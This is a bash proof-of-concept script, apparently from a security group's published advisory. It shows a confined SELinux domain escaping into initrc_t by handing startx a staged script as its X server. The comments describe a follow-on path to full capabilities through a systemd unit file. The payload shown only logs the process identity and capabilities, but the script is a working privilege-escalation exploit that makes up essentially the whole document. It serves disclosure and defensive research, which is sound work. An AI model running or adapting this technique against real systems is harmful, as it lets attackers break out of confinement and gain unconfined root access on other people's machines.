#!/bin/bash
#
# LinnemanLabs - startx direct exec-transition PoC
#
# https://linnemanlabs.com/posts/confined-root-is-still-root
# https://github.com/linnemanlabs/advisories/
#
# startx is labeled initrc_exec_t so a confined domain granted:
#   type_transition ... initrc_exec_t:process initrc_t;
#   allow ... initrc_t:process transition;
# can use the transition to get to initrc_t. we can specify a path
# to the x server when calling startx. this allows us to use the
# startx label to transition to initrc_t and execute our script
# effectively unconfined. initrc_t can write a systemd unit file
# and get fully unconfined reach with full caps.
#
# note: you are still under the systemd confinement of your original
# caller. this provides you a path to init_t domain, which opens many
# paths to unconfined.
#
# logrotate_t, NetworkManager_t, glusterd_t, and a few others can
# use this technique. more info about enumerating that in the post.
#
# needs xorg-x11-xinit installed
# no display required (startx times out, our code runs first)
#
# example:
#   ./startx.sh /var/lib/logrotate/startx
#
# set to a dir we can write from confined domain, output logs go there
STAGE="${1:-/var/lib/logrotate}"
XSRV="${STAGE}/linnemanlabs-startx-poc"

set -eu
if [ ! -d "${STAGE}" ];then
  echo "[*] Creating staging directory ${STAGE}"
  mkdir -p "${STAGE}"
fi

# our "X server" - startx execs this, and the exec transitions us to initrc_t
echo "[*] Staging script at ${XSRV}"
cat > "${XSRV}" <<EOF
#!/bin/sh
{ id; grep ^Cap /proc/self/status; } > ${STAGE}/startx.out

exit 0
EOF
chmod 755 "${XSRV}"

# startx transitions on exec (initrc_exec_t -> initrc_t), then runs our script init_t
echo "[*] Calling startx -- ${STAGE}"
HOME="${STAGE}" timeout 10 /usr/bin/startx -- "${XSRV}" 2>&1

if [ -f "${STAGE}/startx.out" ];then
  echo "[+] check ${STAGE}/startx.out"
else
  echo "[-] output log does not exist. confirm your domain has required transition grants, or required grans to read this file"
fi

exit 0
